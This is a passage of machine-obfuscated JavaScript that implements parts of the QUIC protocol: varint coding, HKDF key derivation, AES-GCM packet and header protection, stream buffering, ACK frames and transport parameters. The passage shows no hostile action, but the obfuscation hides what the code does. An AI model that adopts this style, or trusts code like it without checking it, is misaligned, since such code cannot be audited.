    }, a0b7 = a0cm(0xd0d), a0b8 = 'HttpHost', a0b9 = 'HttpStatus', a0ba = 'HttpHeader', a0bb = 0x1, a0bc = a0cm(0x102), a0bd = a0cm(0x4d1), a0be = Buffer[a0cm(0x1e7)]('38762cf7f55934b34d179ae6a4c80cadccbb7f0a', a0cm(0x47c)), a0bf = Buffer['from'](a0cm(0x160), a0cm(0x47c)), a0bg = 0x10, a0bh = 0x4, a0bi = 0x4d0, a0bj = 0x4b0, a0bk = 0x0, a0bl = 0x1, a0bm = 0x2, a0bn = [
        'initial',
        a0cm(0xa04),
        a0cm(0x382)
    ], a0bo = {
        'padding': 0x0,
        'ping': 0x1,
        'ack': 0x2,
        'ackEcn': 0x3,
        'resetStream': 0x4,
        'stopSending': 0x5,
        'crypto': 0x6,
        'newToken': 0x7,
        'stream': 0x8,
        'maxData': 0x10,
        'maxStreamData': 0x11,
        'maxStreamsBidi': 0x12,
        'maxStreamsUni': 0x13,
        'newConnectionId': 0x18,
        'retireConnectionId': 0x19,
        'pathChallenge': 0x1a,
        'pathResponse': 0x1b,
        'transportClose': 0x1c,
        'applicationClose': 0x1d,
        'handshakeDone': 0x1e,
        'datagram': 0x30,
        'datagramLen': 0x31
    }, a0bp = {
        'originalDestinationConnectionId': 0x0,
        'maxIdleTimeout': 0x1,
        'statelessResetToken': 0x2,
        'maxUdpPayloadSize': 0x3,
        'initialMaxData': 0x4,
        'initialMaxStreamDataBidiLocal': 0x5,
        'initialMaxStreamDataBidiRemote': 0x6,
        'initialMaxStreamDataUni': 0x7,
        'initialMaxStreamsBidi': 0x8,
        'initialMaxStreamsUni': 0x9,
        'ackDelayExponent': 0xa,
        'maxAckDelay': 0xb,
        'disableActiveMigration': 0xc,
        'activeConnectionIdLimit': 0xe,
        'initialSourceConnectionId': 0xf,
        'retrySourceConnectionId': 0x10,
        'maxDatagramFrameSize': 0x20
    };
function a0bq(a) {
    const hu = a0cm, b = {
            'prTsJ': function (d, f) {
                return d < f;
            }
        }, c = BigInt(a);
    if (b[hu(0x1b4)](c, 0x40n))
        return 0x1;
    if (c < 0x4000n)
        return 0x2;
    if (b['prTsJ'](c, 0x40000000n))
        return 0x4;
    return 0x8;
}
function a0br(a) {
    const hv = a0cm, b = {
            'okxua': function (j, k) {
                return j(k);
            },
            'aVyts': function (j, k) {
                return j < k;
            },
            'ZVcHe': function (j, k) {
                return j - k;
            },
            'gSIbJ': function (j, k) {
                return j > k;
            },
            'DDMvq': function (j, k) {
                return j & k;
            },
            'jRLrL': function (j, k) {
                return j | k;
            }
        }, c = b[hv(0x752)](BigInt, a);
    let d, f, g;
    if (c < 0x40n)
        f = 0x1, g = 0x0;
    else {
        if (b[hv(0xa65)](c, 0x4000n))
            f = 0x2, g = 0x40;
        else
            c < 0x40000000n ? (f = 0x4, g = 0x80) : (f = 0x8, g = 0xc0);
    }
    d = Buffer[hv(0x2d9)](f);
    let h = c;
    for (let j = b['ZVcHe'](f, 0x1); b[hv(0x438)](j, 0x0); j--) {
        d[j] = Number(b[hv(0x79f)](h, 0xffn)), h >>= 0x8n;
    }
    return d[0x0] = b[hv(0x83d)](b[hv(0x752)](Number, h), g), d;
}
function a0bs(a, b) {
    const hw = a0cm, c = {
            'EWCdO': function (h, j) {
                return h < j;
            },
            'aNyJg': function (h, j) {
                return h << j;
            },
            'DjPZh': function (h, j) {
                return h >> j;
            },
            'VGOYU': function (h, j) {
                return h < j;
            },
            'xmzII': function (h, j) {
                return h(j);
            },
            'PXokj': function (h, j) {
                return h & j;
            },
            'PzSGK': function (h, j) {
                return h | j;
            },
            'pGCmu': function (h, j) {
                return h(j);
            },
            'tXbge': function (h, j) {
                return h + j;
            }
        };
    if (c['EWCdO'](a[hw(0x55c)] - b, 0x1))
        return null;
    const d = a[b], f = c[hw(0x492)](0x1, c[hw(0x711)](d, 0x6));
    if (c['VGOYU'](a[hw(0x55c)] - b, f))
        return null;
    let g = c[hw(0xccd)](BigInt, c[hw(0x4a8)](d, 0x3f));
    for (let h = 0x1; h < f; h++) {
        g = c[hw(0x558)](g << 0x8n, c[hw(0x79c)](BigInt, a[c['tXbge'](b, h)]));
    }
    return [
        g,
        f
    ];
}
class a0bt {
    constructor() {
        const hx = a0cm;
        this[hx(0x8d1)] = [];
    }
    ['byte'](a) {
        const hy = a0cm, b = {
                'lpOEi': function (c, d) {
                    return c & d;
                }
            };
        return this['parts'][hy(0x1d5)](Buffer['from']([b['lpOEi'](a, 0xff)])), this;
    }
    [a0cm(0x6c9)](a) {
        const hz = a0cm;
        return this[hz(0x8d1)]['push'](Buffer[hz(0x45a)](a) ? a : Buffer[hz(0x1e7)](a)), this;
    }
    [a0cm(0xd16)](a, b) {
        const hA = a0cm, c = {
                'PXzMu': function (f, g) {
                    return f - g;
                },
                'JEcFy': function (f, g) {
                    return f >= g;
                },
                'XudOe': function (f, g) {
                    return f(g);
                },
                'hGRSV': function (f, g) {
                    return f & g;
                }
            }, d = Buffer['alloc'](b);
        for (let f = c[hA(0x1c6)](b, 0x1); c[hA(0x671)](f, 0x0); f--) {
            d[f] = c['XudOe'](Number, c[hA(0x81b)](a, 0xffn)), a >>= 0x8n;
        }
        return this['parts'][hA(0x1d5)](d), this;
    }
    ['u8'](a) {
        const hB = a0cm, b = {
                'MgpWl': function (c, d) {
                    return c & d;
                }
            };
        return this['parts'][hB(0x1d5)](Buffer[hB(0x1e7)]([b[hB(0xcb9)](a, 0xff)])), this;
    }
    [a0cm(0xd68)](a) {
        const hC = a0cm, b = {
                'ebEyF': function (d, f) {
                    return d & f;
                }
            }, c = Buffer['alloc'](0x2);
        return c[hC(0xa21)](b[hC(0x49f)](a, 0xffff), 0x0), this[hC(0x8d1)][hC(0x1d5)](c), this;
    }
    [a0cm(0x53f)](a) {
        const hD = a0cm, b = {
                'FlwaF': function (d, f) {
                    return d >>> f;
                }
            }, c = Buffer[hD(0x2d9)](0x4);
        return c[hD(0xcf6)](b[hD(0x436)](a, 0x0), 0x0), this['parts'][hD(0x1d5)](c), this;
    }
    [a0cm(0x432)](a) {
        const hE = a0cm, b = {
                'gQvlL': function (c, d) {
                    return c(d);
                }
            };
        return this[hE(0x8d1)]['push'](b['gQvlL'](a0br, a)), this;
    }
    ['build']() {
        const hF = a0cm;
        return Buffer['concat'](this[hF(0x8d1)]);
    }
}
class a0bu {
    constructor(a) {
        const hG = a0cm;
        this[hG(0x93f)] = a, this['pos'] = 0x0;
    }
    get ['remaining']() {
        const hH = a0cm, a = {
                'XVuvR': function (b, c) {
                    return b - c;
                }
            };
        return a[hH(0x255)](this[hH(0x93f)][hH(0x55c)], this[hH(0x987)]);
    }
    ['byte']() {
        const hI = a0cm, a = this[hI(0x93f)][this[hI(0x987)]];
        return this[hI(0x987)] += 0x1, a;
    }
    [a0cm(0xd68)]() {
        const hJ = a0cm, a = this[hJ(0x93f)]['readUInt16BE'](this['pos']);
        return this[hJ(0x987)] += 0x2, a;
    }
    [a0cm(0xb58)]() {
        const hK = a0cm, a = this['buffer'][hK(0x268)](this[hK(0x987)], 0x3);
        return this['pos'] += 0x3, a;
    }
    [a0cm(0x53f)]() {
        const hL = a0cm, a = this[hL(0x93f)][hL(0xbfa)](this[hL(0x987)]);
        return this[hL(0x987)] += 0x4, a;
    }
    [a0cm(0x6c9)](a) {
        const hM = a0cm, b = {
                'whvMu': function (d, f) {
                    return d + f;
                }
            }, c = this[hM(0x93f)][hM(0x262)](this['pos'], b[hM(0x976)](this[hM(0x987)], a));
        return this[hM(0x987)] += a, c;
    }
    ['varint']() {
        const hN = a0cm, a = {
                'uIgui': function (c, d, f) {
                    return c(d, f);
                },
                'ZhcoO': function (c, d) {
                    return c === d;
                },
                'eJATo': hN(0xb8d)
            }, b = a['uIgui'](a0bs, this[hN(0x93f)], this[hN(0x987)]);
        if (a[hN(0x1f2)](b, null))
            throw new Error(a['eJATo']);
        return this[hN(0x987)] += b[0x1], b[0x0];
    }
    [a0cm(0x6a7)]() {
        const hO = a0cm, a = {
                'pNSuR': function (c, d) {
                    return c(d);
                }
            }, b = this['varint']();
        if (b > a[hO(0x47b)](BigInt, Number[hO(0xb77)]))
            return Number['MAX_SAFE_INTEGER'];
        return a[hO(0x47b)](Number, b);
    }
}
function a0bv(a, b, c) {
    const hP = a0cm;
    return a0k[hP(0x5d4)](a, b)['update'](c)[hP(0x2f9)]();
}
function a0bw(a, b, c, d) {
    const hQ = a0cm, f = {
            'cAGSk': function (j, k) {
                return j < k;
            }
        }, g = [];
    let h = Buffer['alloc'](0x0), i = 0x1;
    while (f[hQ(0x7f3)](g[hQ(0x2ec)]((j, k) => j + k[hQ(0x55c)], 0x0), d)) {
        h = a0k['createHmac'](a, b)[hQ(0x442)](Buffer[hQ(0x5f9)]([
            h,
            c,
            Buffer[hQ(0x1e7)]([i])
        ]))[hQ(0x2f9)](), g[hQ(0x1d5)](h), i++;
    }
    return Buffer[hQ(0x5f9)](g)[hQ(0x262)](0x0, d);
}
function a0bx(a, b, c, d, f) {
    const hR = a0cm, g = {
            'FcgoL': hR(0x43b),
            'HKAJD': hR(0x7d9),
            'TMytu': function (k, l) {
                return k & l;
            },
            'Wtzbb': function (k, l, m, n, o) {
                return k(l, m, n, o);
            }
        }, h = Buffer[hR(0x5f9)]([
            Buffer['from'](g[hR(0x3c2)], g[hR(0x727)]),
            Buffer[hR(0x1e7)](c, g[hR(0x727)])
        ]), i = d || Buffer[hR(0x2d9)](0x0), j = Buffer['concat']([
            Buffer[hR(0x1e7)]([
                f >> 0x8 & 0xff,
                g[hR(0xba0)](f, 0xff)
            ]),
            Buffer[hR(0x1e7)]([h['length']]),
            h,
            Buffer['from']([i[hR(0x55c)]]),
            i
        ]);
    return g[hR(0x57f)](a0bw, a, b, j, f);
}
class a0by {
    constructor(a, b, c) {
        const hS = a0cm, d = {
                'wMieW': function (g, h) {
                    return g === h;
                },
                'cZEAm': hS(0x941),
                'MVFSn': function (g, h, i, j, k, l) {
                    return g(h, i, j, k, l);
                },
                'NganE': hS(0x717),
                'tGxFU': 'quic\x20iv',
                'iyVWy': 'quic\x20hp',
                'KcUUN': hS(0xd86),
                'zwCKV': hS(0x30c)
            };
        this[hS(0xad4)] = a, this[hS(0x32d)] = b, this[hS(0xd36)] = c;
        const f = d[hS(0x250)](b, d['cZEAm']) ? 0x20 : 0x10;
        this[hS(0x3fd)] = d[hS(0x26e)](a0bx, a, c, d[hS(0xb70)], Buffer[hS(0x2d9)](0x0), f), this['iv'] = d[hS(0x26e)](a0bx, a, c, d['tGxFU'], Buffer[hS(0x2d9)](0x0), 0xc), this[hS(0x8d9)] = d['MVFSn'](a0bx, a, c, d[hS(0x932)], Buffer[hS(0x2d9)](0x0), f), this[hS(0x79d)] = f === 0x20 ? d[hS(0x8a6)] : d[hS(0x67f)], this[hS(0x4bf)] = 0x10;
    }
    [a0cm(0x977)](a) {
        const hT = a0cm, b = {
                'ucCFX': function (f, g) {
                    return f < g;
                },
                'TGsCt': function (f, g) {
                    return f - g;
                },
                'cqcnd': function (f, g) {
                    return f(g);
                },
                'EYmfL': function (f, g) {
                    return f & g;
                }
            }, c = Buffer[hT(0x1e7)](this['iv']);
        let d = BigInt(a);
        for (let f = 0x0; b[hT(0xfb)](f, 0x8); f++) {
            c[b[hT(0x8d6)](0xb, f)] ^= b[hT(0xc2c)](Number, b[hT(0xc65)](d, 0xffn)), d >>= 0x8n;
        }
        return c;
    }
    ['mask'](a) {
        const hU = a0cm, b = a0k[hU(0x925)](this[hU(0x79d)], this[hU(0x8d9)], null);
        return b[hU(0x8ca)](![]), Buffer[hU(0x5f9)]([
            b[hU(0x442)](a),
            b['final']()
        ])[hU(0x262)](0x0, 0x5);
    }
    [a0cm(0x858)](a, b, c) {
        const hV = a0cm, d = a0k[hV(0x925)](this['cipher'], this[hV(0x3fd)], this['nonce'](a));
        d[hV(0x89f)](b);
        const f = Buffer[hV(0x5f9)]([
                d[hV(0x442)](c),
                d[hV(0x890)]()
            ]), g = d['getAuthTag']();
        return Buffer[hV(0x5f9)]([
            f,
            g
        ]);
    }
    [a0cm(0x3f8)](a, b, c) {
        const hW = a0cm, d = {
                'XtqND': function (g, h) {
                    return g - h;
                }
            }, f = a0k[hW(0x2f0)](this[hW(0x32d)], this['key'], this[hW(0x977)](a));
        return f[hW(0x89f)](b), f[hW(0xbf9)](c['subarray'](c['length'] - this[hW(0x4bf)])), Buffer[hW(0x5f9)]([
            f[hW(0x442)](c[hW(0x262)](0x0, d[hW(0x4c0)](c[hW(0x55c)], this['tagSize']))),
            f[hW(0x890)]()
        ]);
    }
}
function a0bz(a, b) {
    const hX = a0cm, c = {
            'nGVED': function (f, g, h, i, j, k) {
                return f(g, h, i, j, k);
            },
            'XaiJN': hX(0x511)
        }, d = new a0by(a[hX(0xad4)], a[hX(0x32d)], c[hX(0x739)](a0bx, a[hX(0xad4)], a[hX(0xd36)], c[hX(0x586)], Buffer[hX(0x2d9)](0x0), a['secret'][hX(0x55c)]));
    return b && (d['hpKey'] = a[hX(0x8d9)]), d;
}
function a0bA(a, b) {
    const hY = a0cm, c = {
            'nXbjy': 'sha256',
            'kLHdM': function (i, j, k, l) {
                return i(j, k, l);
            },
            'fXFHV': hY(0xb2d),
            'QHBcv': hY(0x90f),
            'wLaIt': function (i, j, k, l, m, n) {
                return i(j, k, l, m, n);
            },
            'cVvyd': hY(0xba4),
            'MyMrt': function (i, j, k, l, m, n) {
                return i(j, k, l, m, n);
            }
        }, d = c[hY(0x8ba)], f = c[hY(0x364)](a0bv, d, a0be, a), g = b ? hY(0x90f) : c[hY(0x3e5)], h = b ? c[hY(0x3e5)] : c[hY(0xbb6)];
    return {
        'send': new a0by(d, 'aes-128-gcm', c[hY(0x145)](a0bx, d, f, g, Buffer[hY(0x2d9)](0x0), 0x20)),
        'recv': new a0by(d, c[hY(0x3bf)], c[hY(0x35d)](a0bx, d, f, h, Buffer[hY(0x2d9)](0x0), 0x20))
    };
}
function a0bB(a, b, c) {
    const hZ = a0cm, d = {
            'DTEtl': function (g, h) {
                return g + h;
            },
            'gXsmE': function (g, h) {
                return g <= h;
            },
            'KzkrY': function (g, h) {
                return g >= h;
            },
            'ThWkv': function (g, h) {
                return g < h;
            },
            'DiSzT': function (g, h) {
                return g - h;
            }
        }, f = [];
    for (const g of a) {
        const h = g[hZ(0xae2)], i = d['DTEtl'](g['start'], g[hZ(0x55c)]);
        if (d[hZ(0xd6f)](i, b) || d[hZ(0x8c3)](h, c)) {
            f[hZ(0x1d5)](g);
            continue;
        }
        d[hZ(0xa1c)](h, b) && f[hZ(0x1d5)]({
            'start': h,
            'length': d[hZ(0x256)](b, h)
        }), i > c && f[hZ(0x1d5)]({
            'start': c,
            'length': d['DiSzT'](i, c)
        });
    }
    return f;
}
function a0bC(c, d) {
    const i0 = a0cm, f = {
            'UXLSe': function (i, j) {
                return i - j;
            },
            'AOIMv': function (i, j) {
                return i <= j;
            },
            'hGkbB': function (i, j) {
                return i + j;
            }
        }, g = c[i0(0x5f9)](d)[i0(0x234)]((i, j) => i[i0(0xae2)] - j[i0(0xae2)]), h = [];
    for (const i of g) {
        const j = h['length'] ? h[f[i0(0x1f8)](h['length'], 0x1)] : null, k = i[i0(0xae2)] + i['length'];
        j && f[i0(0xcf0)](i['start'], f[i0(0xd33)](j[i0(0xae2)], j[i0(0x55c)])) ? j[i0(0x55c)] = Math[i0(0x60c)](j['length'], f[i0(0x1f8)](k, j['start'])) : h[i0(0x1d5)]({
            'start': i[i0(0xae2)],
            'length': i[i0(0x55c)]
        });
    }
    return h;
}
class a0bD {
    constructor(a) {
        const i1 = a0cm, b = { 'RMUpC': i1(0x787) }, c = b[i1(0x5c0)][i1(0xb0c)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[i1(0x253)] = ![];
                continue;
            case '1':
                this['unacked'] = [];
                continue;
            case '2':
                this[i1(0x12b)] = 0x0;
                continue;
            case '3':
                this[i1(0xad1)] = ![];
                continue;
            case '4':
                this[i1(0x5f8)] = Buffer[i1(0x2d9)](0x0);
                continue;
            case '5':
                this[i1(0xb5e)] = a;
                continue;
            case '6':
                this[i1(0x25b)] = [];
                continue;
            }
            break;
        }
    }
    get [a0cm(0x522)]() {
        const i2 = a0cm;
        return this[i2(0x5f8)][i2(0x55c)];
    }
    [a0cm(0x329)](a, b) {
        const i3 = a0cm, c = {
                'wGSsf': function (d, f) {
                    return d - f;
                }
            };
        a[i3(0x55c)] && (this[i3(0x5f8)] = Buffer[i3(0x5f9)]([
            this['data'],
            a
        ]), this[i3(0x25b)][i3(0x1d5)]({
            'start': c[i3(0xce9)](this[i3(0x5f8)][i3(0x55c)], a[i3(0x55c)]),
            'length': a[i3(0x55c)]
        })), b && (this['fin'] = !![], this[i3(0x253)] = !![]);
    }
    [a0cm(0x772)](a) {
        const i4 = a0cm, b = {
                'OJWku': function (g, h) {
                    return g <= h;
                },
                'aflAF': function (g, h) {
                    return g + h;
                },
                'dTPLE': function (g, h) {
                    return g < h;
                },
                'CKyHh': function (g, h) {
                    return g + h;
                },
                'ZqmXC': function (g, h, i) {
                    return g(h, i);
                }
            };
        if (!this[i4(0x25b)][i4(0x55c)] || b[i4(0xcd4)](a, 0x0))
            return null;
        const c = this[i4(0x25b)][0x0], d = Math[i4(0x389)](c['length'], a), f = {
                'start': c['start'],
                'length': d
            };
        return c[i4(0xae2)] += d, c['length'] -= d, !c[i4(0x55c)] && this[i4(0x25b)][i4(0x3b0)](), f[i4(0x6c9)] = this[i4(0x5f8)][i4(0x262)](f[i4(0xae2)], b[i4(0xc28)](f[i4(0xae2)], d)), f[i4(0x3e6)] = b[i4(0x510)](f[i4(0xae2)], this[i4(0x12b)]), this[i4(0x12b)] = Math[i4(0x60c)](this[i4(0x12b)], b[i4(0xd5b)](f[i4(0xae2)], d)), this[i4(0xa52)] = b[i4(0xa2b)](a0bC, this[i4(0xa52)], [{
                'start': f[i4(0xae2)],
                'length': d
            }]), f;
    }
    [a0cm(0xd2c)]() {
        const i5 = a0cm;
        if (!this[i5(0xad1)] || !this[i5(0x253)] || this[i5(0x25b)][i5(0x55c)] || this[i5(0xa52)]['length'])
            return ![];
        return this[i5(0x253)] = ![], !![];
    }
    ['ack'](a, b, c) {
        const i6 = a0cm, d = {
                'dXwQE': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'HqAFH': function (f, g) {
                    return f + g;
                },
                'OLZMt': function (f, g) {
                    return f >= g;
                }
            };
        this['unacked'] = d['dXwQE'](a0bB, this[i6(0xa52)], a, d[i6(0x9d9)](a, b)), c && this[i6(0xad1)] && d[i6(0x24e)](d['HqAFH'](a, b), this[i6(0x5f8)][i6(0x55c)]) && (this[i6(0x253)] = ![]), this[i6(0xb5e)][i6(0xb00)]();
    }
    [a0cm(0xafd)]() {
        const i7 = a0cm, a = {
                'Clvmq': function (b, c, d) {
                    return b(c, d);
                }
            };
        this[i7(0xa52)]['length'] && (this['frontier'] = this[i7(0xa52)][0x0]['start'], this['pending'] = a['Clvmq'](a0bC, this[i7(0x25b)], this['unacked'])['sort']((c, d) => c['start'] - d[i7(0xae2)]), this[i7(0xa52)] = []), this['fin'] && (this[i7(0x253)] = !![]);
    }
    [a0cm(0x519)](a) {
        const i8 = a0cm, b = {
                'OfxZV': function (c, d, f) {
                    return c(d, f);
                }
            };
        for (const c of a) {
            if (!c[i8(0x55c)]) {
                c[i8(0xad1)] && this[i8(0xad1)] && (this[i8(0x253)] = !![]);
                continue;
            }
            this[i8(0xa52)] = a0bB(this[i8(0xa52)], c[i8(0xae2)], c[i8(0xae2)] + c[i8(0x55c)]), this[i8(0x25b)] = b[i8(0x4cc)](a0bC, this[i8(0x25b)], [{
                    'start': c[i8(0xae2)],
                    'length': c[i8(0x55c)]
                }])['sort']((d, f) => d[i8(0xae2)] - f['start']);
        }
    }
    [a0cm(0xb74)]() {
        const i9 = a0cm;
        return !this['pending']['length'] && !this[i9(0xa52)][i9(0x55c)] && !this[i9(0x253)];
    }
}
class a0bE {
    constructor() {
        const ia = a0cm;
        this[ia(0x80d)] = 0x0, this[ia(0x25b)] = [];
    }
    [a0cm(0x1e9)](a, b) {
        const ib = a0cm, c = {
                'pxzTQ': function (f, g) {
                    return f + g;
                },
                'JbgHz': function (f, g) {
                    return f < g;
                },
                'MIeDA': function (f, g) {
                    return f - g;
                },
                'BpdlQ': function (f, g) {
                    return f === g;
                }
            };
        if (a > c[ib(0x348)](this[ib(0x80d)], 0x100000))
            return Buffer[ib(0x2d9)](0x0);
        if (c['JbgHz'](a, this[ib(0x80d)])) {
            const f = c[ib(0xa6b)](this[ib(0x80d)], a);
            if (f >= b[ib(0x55c)])
                return Buffer['alloc'](0x0);
            b = b[ib(0x262)](f), a = this[ib(0x80d)];
        }
        if (!b[ib(0x55c)])
            return Buffer[ib(0x2d9)](0x0);
        if (a !== this[ib(0x80d)])
            return this[ib(0x25b)][ib(0x1d5)]({
                'start': a,
                'bytes': Buffer[ib(0x1e7)](b)
            }), Buffer[ib(0x2d9)](0x0);
        const d = [b];
        this[ib(0x80d)] += b[ib(0x55c)];
        for (let g = !![]; g;) {
            g = ![];
            for (let h = 0x0; c[ib(0x232)](h, this['pending'][ib(0x55c)]); h++) {
                if (c[ib(0xad8)](this['pending'][h][ib(0xae2)], this[ib(0x80d)])) {
                    d[ib(0x1d5)](this[ib(0x25b)][h][ib(0x6c9)]), this[ib(0x80d)] += this[ib(0x25b)][h][ib(0x6c9)][ib(0x55c)], this[ib(0x25b)][ib(0x8cd)](h, 0x1), g = !![];
                    break;
                }
            }
        }
        return Buffer[ib(0x5f9)](d);
    }
}
function a0bF(a, b, c, d) {
    const ic = a0cm, f = {
            'wOVhK': function (j, k) {
                return j < k;
            },
            'LITVm': function (j, k) {
                return j + k;
            },
            'eukSl': function (j, k) {
                return j + k;
            },
            'desGf': function (j, k) {
                return j + k;
            },
            'lNbjw': function (j, k) {
                return j + k;
            },
            'DNeGY': function (j, k) {
                return j & k;
            },
            'ikWLI': function (j, k) {
                return j + k;
            }
        };
    if (f[ic(0x793)](b[ic(0x55c)], f['LITVm'](f[ic(0x270)](c, 0x4), a0bg)))
        return null;
    const g = a['mask'](b['subarray'](f[ic(0x924)](c, 0x4), f[ic(0xbd3)](f[ic(0xc14)](c, 0x4), a0bg))), h = Buffer[ic(0x1e7)](b);
    h[0x0] ^= f[ic(0xbe2)](g[0x0], d ? 0xf : 0x1f);
    for (let j = 0x0; j < a0bh; j++) {
        h[f[ic(0x924)](c, j)] ^= g[f['ikWLI'](0x1, j)];
    }
    return h;
}
function a0bG(a, b, c, d) {
    const id = a0cm, f = {
            'EJVyG': function (l, m) {
                return l < m;
            },
            'SkMll': function (l, m) {
                return l + m;
            },
            'iPnlD': function (l, m) {
                return l + m;
            },
            'mtiCx': function (l, m) {
                return l & m;
            },
            'SatLa': function (l, m) {
                return l + m;
            },
            'FZewn': function (l, m) {
                return l < m;
            },
            'ceMrI': function (l, m) {
                return l + m;
            },
            'WCNge': function (l, m) {
                return l * m;
            },
            'jeJOb': function (l, m) {
                return l + m;
            }
        };
    if (f['EJVyG'](b[id(0x55c)], f[id(0xa7d)](c + 0x4, a0bg)))
        return null;
    const g = a['mask'](b[id(0x262)](f[id(0xa7d)](c, 0x4), f['iPnlD'](f[id(0xa7d)](c, 0x4), a0bg))), h = Buffer[id(0x1e7)](b);
    h[0x0] ^= f[id(0xa14)](g[0x0], d ? 0xf : 0x1f);
    const j = f[id(0xa6d)](h[0x0] & 0x3, 0x1);
    for (let l = 0x0; f[id(0x569)](l, j); l++) {
        h[f['SkMll'](c, l)] ^= g[f['SatLa'](0x1, l)];
    }
    let k = 0x0;
    for (let m = 0x0; f['FZewn'](m, j); m++) {
        k = f[id(0xda8)](f[id(0x40e)](k, 0x100), h[f[id(0x9e1)](c, m)]);
    }
    return [
        h['subarray'](0x0, f[id(0x91a)](c, j)),
        k
    ];
}
function a0bH(a, b, c) {
    const ie = a0cm, d = {
            'Nrnom': function (j, k) {
                return j + k;
            },
            'CGzxy': function (j, k) {
                return j - k;
            },
            'RGCuD': function (j, k) {
                return j(k);
            },
            'FCdXO': function (j, k) {
                return j | k;
            },
            'DhGlA': function (j, k) {
                return j & k;
            },
            'LXddV': function (j, k) {
                return j << k;
            },
            'wiRJr': function (j, k) {
                return j(k);
            },
            'JzRIy': function (j, k) {
                return j <= k;
            },
            'iocGk': function (j, k) {
                return j + k;
            },
            'szyjy': function (j, k) {
                return j(k);
            },
            'UNjdd': function (j, k) {
                return j > k;
            },
            'OzwmH': function (j, k) {
                return j >= k;
            },
            'kOkqw': function (j, k) {
                return j << k;
            },
            'ijdnA': function (j, k) {
                return j(k);
            },
            'GMgBd': function (j, k) {
                return j << k;
            },
            'dedIQ': function (j, k) {
                return j(k);
            }
        }, f = d[ie(0x27d)](BigInt(a), 0x1n), g = d[ie(0x93e)](0x1n << d['RGCuD'](BigInt, b), 0x1n);
    let h = d['FCdXO'](d[ie(0x6dc)](f, ~g), d[ie(0xa5e)](BigInt, c));
    const i = d[ie(0xbac)](0x1n, d[ie(0xc89)](BigInt, d['CGzxy'](b, 0x1)));
    if (d[ie(0x8b6)](d['iocGk'](h, i), f))
        h += 0x1n << d[ie(0x3a4)](BigInt, b);
    else
        d[ie(0xea)](h, f + i) && d[ie(0x76c)](h, d[ie(0x662)](0x1n, d[ie(0x816)](BigInt, b))) && (h -= d[ie(0xaf4)](0x1n, d[ie(0x1f6)](BigInt, b)));
    return Number(h);
}
function a0bI(a) {
    const ig = a0cm, b = {
            'HwTnr': function (j, k) {
                return j - k;
            },
            'MNdRX': function (j, k) {
                return j - k;
            },
            'AGFcB': function (j, k) {
                return j - k;
            }
        }, c = new a0bt();
    c[ig(0x347)](a0bo['ack']);
    const d = a[ig(0x2d5)]()[ig(0x234)]((j, k) => j[ig(0xae2)] - k[ig(0xae2)]), f = d[b[ig(0x82b)](d[ig(0x55c)], 0x1)], g = b[ig(0x82b)](f[ig(0xae2)] + f[ig(0x55c)], 0x1);
    c[ig(0x432)](g), c[ig(0x432)](0x0), c[ig(0x432)](d['length'] - 0x1), c[ig(0x432)](b['HwTnr'](g, f[ig(0xae2)]));
    let h = f[ig(0xae2)];
    for (let j = d[ig(0x55c)] - 0x2; j >= 0x0; j--) {
        const k = d[j], l = b[ig(0x82b)](k['start'] + k['length'], 0x1);
        c[ig(0x432)](b['MNdRX'](b[ig(0x482)](h, l), 0x2)), c[ig(0x432)](l - k['start']), h = k[ig(0xae2)];
    }
    return c[ig(0x177)]();
}
function a0bJ(a) {
    const ih = a0cm, b = {
            'AUxuQ': function (k, l) {
                return k + l;
            },
            'gVyep': function (k, l) {
                return k - l;
            },
            'xqeOf': function (k, l) {
                return k < l;
            },
            'EARxP': function (k, l) {
                return k / l;
            }
        }, c = a['number'](), d = a[ih(0x6a7)](), f = a[ih(0x6a7)](), g = a[ih(0x6a7)](), h = [{
                'start': c - g,
                'length': b[ih(0xa06)](g, 0x1)
            }];
    let j = b[ih(0x5ba)](c, g);
    for (let k = 0x0; b[ih(0x792)](k, f); k++) {
        const l = a[ih(0x6a7)](), m = a[ih(0x6a7)](), n = b[ih(0x5ba)](b[ih(0x5ba)](j, l), 0x2);
        h[ih(0x1d5)]({
            'start': n - m,
            'length': m + 0x1
        }), j = b[ih(0x5ba)](n, m);
    }
    return h[ih(0x856)] = b[ih(0x45d)](d, 0x3e8), h;
}
function a0bK(a) {
    const ii = a0cm, b = {
            'FeruB': function (f, g) {
                return f > g;
            },
            'FApiq': function (f, g) {
                return f(g);
            },
            'VnUEi': function (f, g) {
                return f < g;
            },
            'KdhhO': function (f, g) {
                return f === g;
            },
            'kfeBw': function (f, g) {
                return f === g;
            },
            'dilIw': function (f, g) {
                return f + g;
            }
        }, c = {}, d = new a0bu(a);
    while (b[ii(0x66b)](d['remaining'], 0x0)) {
        const f = b['FApiq'](Number, d[ii(0x432)]()), g = d[ii(0x6a7)]();
        if (b[ii(0x264)](d['remaining'], g))
            break;
        const h = d[ii(0x6c9)](g);
        if (h[ii(0x55c)] === 0x1 || b[ii(0x32b)](h[ii(0x55c)], 0x2) || b[ii(0x32b)](h['length'], 0x4) || b['kfeBw'](h['length'], 0x8)) {
            let i = 0x0;
            for (const j of h) {
                i = b[ii(0xaa4)](i * 0x100, j);
            }
            c[f] = i;
        } else
            c[f] = Buffer[ii(0x1e7)](h);
    }
    return c;
}
function a0bL(a) {
    const ij = a0cm, b = {
            'rGWrN': function (d, f) {
                return d === f;
            },
            'USimi': function (d, f) {
                return d(f);
            }
        }, c = new a0bt();
    for (const [d, f] of a) {
        let g;
        if (Buffer[ij(0x45a)](f))
            g = f;
        else
            b[ij(0x89b)](f, !![]) ? g = Buffer[ij(0x2d9)](0x0) : g = b['USimi'](a0br, f);
        c[ij(0x432)](d), c[ij(0x432)](g[ij(0x55c)]), c[ij(0x6c9)](g);
    }
    return c[ij(0x177)]();
}
function a0bM(a, b) {
    const ik = a0cm, c = Buffer[ik(0x2d9)](0x4);
    return c[0x0] = a, c['writeUIntBE'](b[ik(0x55c)], 0x1, 0x3), Buffer['concat']([
        c,
        b
    ]);
}
function a0bN(a, b) {
    const il = a0cm, c = Buffer[il(0x2d9)](0x4);
    return c['writeUInt16BE'](a, 0x0), c['writeUInt16BE'](b['length'], 0x2), Buffer[il(0x5f9)]([
        c,
        b
    ]);
}
class a0bO {
    constructor(a, b, c) {
        const im = a0cm, d = {
                'nDifB': '10|9|4|0|12|6|5|1|7|3|11|2|8',
                'bctgQ': 'x25519',
                'WaWsF': im(0xba4),
                'NUbwW': im(0x5bc),
                'keQbF': im(0x3da)
            }, f = d[im(0x3fb)][im(0xb0c)]('|');
